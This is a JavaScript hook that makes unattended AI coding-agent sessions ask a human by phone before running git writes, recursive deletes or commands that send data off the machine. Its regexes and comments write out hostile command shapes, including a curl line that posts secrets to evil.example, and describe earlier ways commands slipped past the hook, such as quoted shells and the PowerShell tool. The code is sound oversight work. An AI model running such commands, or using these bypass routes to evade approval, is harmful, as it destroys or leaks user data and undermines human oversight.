// PreToolUse hook: relays a mutating command to the phone for an approve/deny
// tap instead of letting it run unsupervised in a headless session.
//
// Wire it up by pointing your agent's PreToolUse hook at this file, with a
// matcher that names EVERY tool that can run a shell. See docs/SECURITY.md.
//
// Two rules govern everything below, and they pull in opposite directions on
// purpose:
//
//   Matching too eagerly costs one extra tap. Matching too narrowly costs the
//   whole backstop. So every ambiguous case resolves towards relaying.
//
//   This file must never crash without emitting a decision first. An unhandled
//   exception here is not something to gamble on as an allow.

const fs = require('fs');
const os = require('os');
const path = require('path');

// Resolved the same way the rest of Halyard resolves it, so a hook launched by
// an agent with a different cwd still finds the right install. HALYARD_DATA_DIR
// is set on the child by the watcher, which is the case that matters.
function dataDir() {
  if (process.env.HALYARD_DATA_DIR) return path.resolve(process.env.HALYARD_DATA_DIR);
  const home = os.homedir();
  if (process.platform === 'win32') return path.join(process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local'), 'halyard');
  if (process.platform === 'darwin') return path.join(home, 'Library', 'Application Support', 'halyard');
  if (process.env.XDG_STATE_HOME) return path.join(process.env.XDG_STATE_HOME, 'halyard');
  return path.join(home, '.local', 'state', 'halyard');
}

// 127.0.0.1, never localhost: the server binds loopback IPv4, and a localhost
// that resolves to ::1 first fails every relay with a connection error - which
// closes the command as 'bridge unreachable' rather than asking anyone.
const PORT = Number(process.env.HALYARD_PORT) || 4545;
const BASE = `http://127.0.0.1:${PORT}`;
const TOKEN_FILE = path.join(dataDir(), 'token.txt');
const TIMEOUT_MS = Number(process.env.HALYARD_RELAY_TIMEOUT_MS) || 5 * 60 * 1000;
const POLL_MS = 3000;

// Matches `git` anywhere in the command line, not just at the start, and skips
// over any options sitting between `git` and its subcommand. A start-anchored
// match let `git -C ../other push --force`, `git -c user.name=x commit` and
// `cd sub && git reset --hard origin/main` all slip through unrelayed - and under
// --permission-mode bypassPermissions, unrelayed means it simply runs. Matching too
// eagerly only costs an extra Approve tap; matching too narrowly costs the backstop.
//
// The leading boundary is a negative lookbehind rather than the old
// `(?:^|[;&|]\s*|\s)` alternation, which required the character before `git` to be
// whitespace, a chaining metacharacter, or start-of-string. A QUOTE is none of
// those, so `sh -c "git push --force"` and `powershell -Command "git reset --hard"`
// were not matched and ran with no relay at all. Both are the obvious way to write
// the command you would least want unrelayed. `(?<!\w)` accepts any non-word lead-in
// - quote, backtick, `$(`, `;` with no space - while still rejecting the words that
// merely end in git (`legit push`, `digit push`). It deliberately does not exclude
// `/`, so an absolute `/usr/bin/git push` still matches.
const MUTATING_GIT = /(?<!\w)git\s+(?:(?:-[cC]\s+\S+|--git-dir=\S+|--work-tree=\S+|--no-pager)\s+)*(add|commit|push|checkout|switch|branch|merge|rebase|reset|revert|tag|stash|restore|clean|cherry-pick|rm|mv)\b/;

// Bash is not the only tool that runs a shell. The CLI Halyard launches
// (the Claude Code CLI) also ships a PowerShell tool, and a
// headless run reaching for that one instead sailed straight past this hook:
// tool_name !== 'Bash' returned passthrough, and under
// --permission-mode bypassPermissions "unrelayed" means "simply runs". So
// `git push --force` or `git reset --hard` via the PowerShell tool had no
// backstop at all, which is precisely the hole this file exists to close.
// Both tools carry the command line on tool_input.command, so one gate covers
// them. Keep this in sync with the matcher in your agent hook matcher - the
// matcher decides which tools reach this script in the first place, and a tool
// missing from THERE never gets as far as this list.
const RELAYED_TOOLS = new Set(['Bash', 'PowerShell']);

// Recursive deletion. git was the first thing worth a phone tap but it was never
// the only one: under bypassPermissions an unattended run can also empty a
// directory tree, and unlike a bad commit there is nothing to revert afterwards.
//
// Gated on RECURSION, not on force. `rm -f one-file.txt` is routine and blocking
// it would make the bridge tiring to use for no safety gained; `rm -rf <dir>` is
// the shape that removes something you did not enumerate. Same asymmetry argument
// as MUTATING_GIT, applied one notch tighter because the false-positive rate here
// would otherwise be much higher.
const DESTRUCTIVE_FS = new RegExp([
  // POSIX rm with -r/-R anywhere in a flag cluster (-rf, -fr, -Rf, -r) or --recursive
  String.raw`(?<!\w)rm\s+(?:-{1,2}[\w-]+\s+)*-[a-zA-Z]*[rR]`,
  String.raw`(?<!\w)rm\s+(?:-{1,2}[\w-]+\s+)*--recursive`,
  // cmd.exe tree deletes
  String.raw`(?<!\w)(?:rmdir|rd)\s+(?:[^\s]+\s+)*/[sS]`,
  String.raw`(?<!\w)del\s+(?:[^\s]+\s+)*/[sS]`,
  // PowerShell. Remove-Item and its aliases all take -Recurse, so the flag is the
  // reliable half of the match - `ri -Recurse` and `rm -Recurse` are the same call.
  String.raw`(?<!\w)(?:Remove-Item|ri|rmdir|rd|del|erase)\s[\s\S]*?-Recurse\b`,
  // Whole-volume operations. Rare enough that an unnecessary tap costs nothing and
  // catastrophic enough that a missed one costs everything.
  String.raw`(?<!\w)(?:mkfs(?:\.\w+)?|diskpart|Format-Volume|Clear-Disk)\b`,
  String.raw`(?<!\w)format\s+[a-zA-Z]:`,
].join('|'));

// Anything that pushes data or state off this machine. `git push` was already
// relayed; these are the other ways an unattended run publishes something - an
// HTTP request with a body, a file copied to a remote host, or a GitHub object
// created through `gh` (which never touches `git` and so sailed past the original
// matcher entirely, despite `gh pr create` being exactly as public as a push).
//
// Reads are deliberately NOT matched. A headless run fetching a page is the normal
// case and has no outward effect; the trigger is a request that carries a body, an
// upload, or a non-GET method.
// The verb is matched with \b, not \s. `curl\s` consumed the space after the
// command name, and a lazy `[\s\S]*?` cannot give it back - so a flag written
// FIRST (`curl -F file=@secret https://...`) never matched its own `\s-F\s`
// alternative, while the same command with any other flag in front of it did. A
// zero-width boundary leaves the separating whitespace available to the
// alternatives, which is where they expect to find it.
const NETWORK_EGRESS = new RegExp([
  String.raw`(?<!\w)curl\b[\s\S]*?(?:-X\s*(?:POST|PUT|PATCH|DELETE)|--request\s*(?:POST|PUT|PATCH|DELETE)|--data\b|--data-\w+|--form\b|--upload-file\b|\s-d\s|\s-F\s|\s-T\s)`,
  String.raw`(?<!\w)wget\b[\s\S]*?(?:--post-data|--post-file|--method=(?:POST|PUT|PATCH|DELETE))`,
  String.raw`(?<!\w)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|curl\.exe)\b[\s\S]*?(?:-Method\s+(?:POST|PUT|PATCH|DELETE)|-Body\b|-InFile\b|-Form\b)`,
  // A remote target is `host:path` or `user@host:path` - a bare local path has no colon
  // in that position, and a Windows drive letter (`C:\`) is a single character, so the
  // {2,} keeps `scp C:\x host:` style locals from matching on the drive alone.
  String.raw`(?<!\w)(?:scp|rsync|sftp)\b[\s\S]*?[\w.-]{2,}@?[\w.-]*:`,
  String.raw`(?<!\w)gh\s+(?:pr|issue|release|repo|gist|secret|workflow|api)\b[\s\S]*?(?:\bcreate\b|\bedit\b|\bmerge\b|\bset\b|\bdelete\b|\brun\b|-X\s*(?:POST|PUT|PATCH|DELETE)|--method\s*(?:POST|PUT|PATCH|DELETE))`,
].join('|'), 'i');

// A request that never leaves the machine is not egress. This bridge's own API is
// on 127.0.0.1 and a run poking at it with `curl -X POST` is routine here, so
// relaying those would mean a five-minute phone prompt for a loopback call.
//
// The carve-out is narrow on purpose: it applies only when the command mentions a
// loopback URL AND mentions no other http(s) URL at all. `curl -d @secrets
// http://127.0.0.1/x https://evil.example/y` therefore still relays. This is not
// the "ignore text inside quotes" idea the module comment above rejects - that one
// tried to decide whether text executes, which is undecidable; this only asks where
// the URLs in it point, which is right there in the string.
// The trailing lookahead anchors the END of the loopback host. Without it,
// `http://127.0.0.1` matches as a bare prefix of `http://127.0.0.1@evil.example`
// (where 127.0.0.1 is userinfo and the real host is evil.example) and of
// `http://localhost.evil.example` - so isLoopbackOnly() waved through the
// obvious exfiltration URL. `:port`, `/path`, a quote or end-of-string are all
// fine after the host; another label char, a dot, or an `@` are not.
const LOOPBACK_URL = /https?:\/\/(?:127\.0\.0\.1|localhost|\[::1\]|0\.0\.0\.0)(?::\d+)?(?![\w.@-])/i;
const ANY_HTTP_URL = /https?:\/\/[^\s'"`]+/gi;
function isLoopbackOnly(command) {
  if (!LOOPBACK_URL.test(command)) return false;
  const urls = String(command).match(ANY_HTTP_URL) || [];
  return urls.every((u) => LOOPBACK_URL.test(u));
}

// Ordered because the first match names the question the phone is asked. Each rule
// carries the noun that goes into that question - "a git command" and "a recursive
// delete" want different amounts of thought from whoever is holding the phone.
const RELAY_RULES = [
  { name: 'git', label: 'git command', test: (cmd) => MUTATING_GIT.test(cmd) },
  { name: 'destructive-fs', label: 'recursive delete', test: (cmd) => DESTRUCTIVE_FS.test(cmd) },
  { name: 'network-egress', label: 'command that sends data off this machine', test: (cmd) => NETWORK_EGRESS.test(cmd) && !isLoopbackOnly(cmd) },
];

// Returns the matched rule (or null), so the caller can say WHICH kind of thing it
// is relaying. shouldRelay stays a boolean wrapper because that is what the tests
// and the original call site read.
// Which rule families are live. Config, so someone for whom one category is
// pure noise can drop it without editing this file - but an UNSET or empty
// variable means ALL of them, never none. A misspelled or missing env var must
// not silently disarm the backstop; that is the one failure mode this file
// cannot be allowed to have, and it is the reason this is not written as a
// simple `(env.X || '').split(',')`.
function enabledRules(env = process.env) {
  const raw = env.HALYARD_RELAY_RULES;
  if (raw === undefined || raw === '') return RELAY_RULES;
  const want = new Set(String(raw).split(',').map((s) => s.trim()).filter(Boolean));
  if (!want.size) return RELAY_RULES;
  return RELAY_RULES.filter((r) => want.has(r.name));
}

function matchRelayRule(toolName, command, env = process.env) {
  if (!RELAYED_TOOLS.has(toolName)) return null;
  const cmd = String(command || '').trim();
  if (!cmd) return null;
  return enabledRules(env).find((r) => r.test(cmd)) || null;
}

// Split out from main() so test/smoke.js can exercise the tool gate and the
// command match together, rather than only the regex in isolation - the bug
// above was in the gate, not the regex, and a regex-only test could not see it.
function shouldRelay(toolName, command) {
  return matchRelayRule(toolName, command) !== null;
}

// Permission modes in which Claude Code asks the human at the keyboard itself.
// In any of these the relay is pure cost: it re-asks a question the local session
// is already positioned to ask instantly, on a device the user may not even have
// to hand, and denies on a five-minute timeout if they don't.
//
// Deliberately an allow-list, not a deny-list of {bypassPermissions}. A mode name
// this file has never heard of - a future one, a typo, a payload from something
// that isn't Claude Code - lands on "relay", because the failure directions are
// not symmetric: an unnecessary relay costs one tap, a skipped one costs the
// whole backstop. Same reasoning as the MUTATING_GIT comment above.
const ATTENDED_MODES = new Set(['default', 'auto', 'acceptEdits', 'plan']);

// Why this exists at all: the relay is a backstop against an *unattended* run
// mutating a repo with no human in the loop - that is what the module comment
// says and what a loosened permission mode creates. It was
// firing in ordinary interactive sessions too, where it is not a backstop but an
// obstacle: MUTATING_GIT matches git-looking text anywhere on a command line,
// including inside a quoted string or a heredoc body, so writing a *file* that
// merely mentions `git commit` blocked for five minutes and then failed.
//
// The tempting fix - ignore matches inside quotes - is a genuine bypass, and must
// not be done: `sh -c "git push"` is quoted and still executes, as does
// `powershell -Command "git reset --hard"`. Sorting inert text from executed text
// on a shell command line is not decidable by pattern, so the eager match stays
// exactly as it is. What changes is *when* it is consulted.
//
// Two independent signals, either sufficient, because they fail in different
// ways: HALYARD_HEADLESS is set by the watcher on the process it starts
// and is definitive regardless of what the CLI reports, while permission_mode
// still covers any unattended run that did not come from Halyard.
function isUnattended(input, env = process.env) {
  if (env.HALYARD_HEADLESS === '1') return true;
  const mode = input && input.permission_mode;
  if (typeof mode !== 'string' || !mode) return true;
  return !ATTENDED_MODES.has(mode);
}

// Never process.exit() here. This script only ever reaches these functions from
// inside the async main(), with undici's fetch handles still open - exiting from
// there aborts the process on Windows (libuv "UV_HANDLE_CLOSING" assertion, exit
// code 0xC0000409), which Claude Code sees as a failed hook rather than a
// decision, and can truncate a piped stdout write. Setting exitCode and letting
// the loop drain naturally exits 0 and flushes stdout.
function decide(decision, reason) {
  process.stdout.write(JSON.stringify({
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: decision,
      permissionDecisionReason: reason,
    },
  }));
  process.exitCode = 0;
}

function passthrough() {
  process.exitCode = 0;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function main() {
  const raw = fs.readFileSync(0, 'utf8');
  let input;
  try {
    input = JSON.parse(raw);
  } catch (e) {
    return passthrough();
  }

  // Cheapest gate first: an attended session needs no phone round-trip at all.
  if (!isUnattended(input)) return passthrough();

  const command = (input.tool_input && input.tool_input.command) || '';
  const rule = matchRelayRule(input.tool_name, command);
  if (!rule) return passthrough();

  const token = fs.readFileSync(TOKEN_FILE, 'utf8').trim();

  let id;
  try {
    const askRes = await fetch(`${BASE}/api/ask?token=${token}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      // A socket that connects and then goes silent (server wedged on the run
      // lock) must not hang this hook past the point where a decision is
      // emitted - the loop's TIMEOUT_MS only bounds the poll condition, not a
      // single stuck request.
      signal: AbortSignal.timeout(10000),
      body: JSON.stringify({
        // Names what kind of thing it is, not just that something wants to run.
        // "a recursive delete" and "a git command" deserve different amounts of
        // thought from whoever is looking at the phone, and the command itself is
        // shown underneath either way.
        question: `A headless run wants to run a ${rule.label} (${input.tool_name}). Approve?`,
        command,
        options: ['Approve', 'Deny'],
      }),
    });
    if (!askRes.ok) return decide('deny', 'bridge rejected the relay question');
    const askBody = await askRes.json();
    id = askBody.id;
  } catch (e) {
    return decide('deny', 'Halyard unreachable');
  }

  const deadline = Date.now() + TIMEOUT_MS;
  while (Date.now() < deadline) {
    await sleep(POLL_MS);
    try {
      const stateRes = await fetch(`${BASE}/api/state?token=${token}`, { signal: AbortSignal.timeout(10000) });
      const state = await stateRes.json();
      if (state.id === id && state.status === 'answered') {
        return state.answer === 'Approve'
          ? decide('allow', 'approved via phone relay')
          : decide('deny', 'denied via phone relay');
      }
    } catch (e) {
      // transient poll failure, keep trying until deadline
    }
  }
  return decide('deny', 'no phone response within timeout');
}

// Guarded so test/smoke.js can require this file for MUTATING_GIT without the
// hook trying to read a hook payload off stdin.
if (require.main === module) {
  main().catch(() => decide('deny', 'relay hook error'));
}

module.exports = {
  MUTATING_GIT, DESTRUCTIVE_FS, NETWORK_EGRESS, RELAY_RULES,
  RELAYED_TOOLS, ATTENDED_MODES, shouldRelay, matchRelayRule, isLoopbackOnly, isUnattended,
  enabledRules,
};
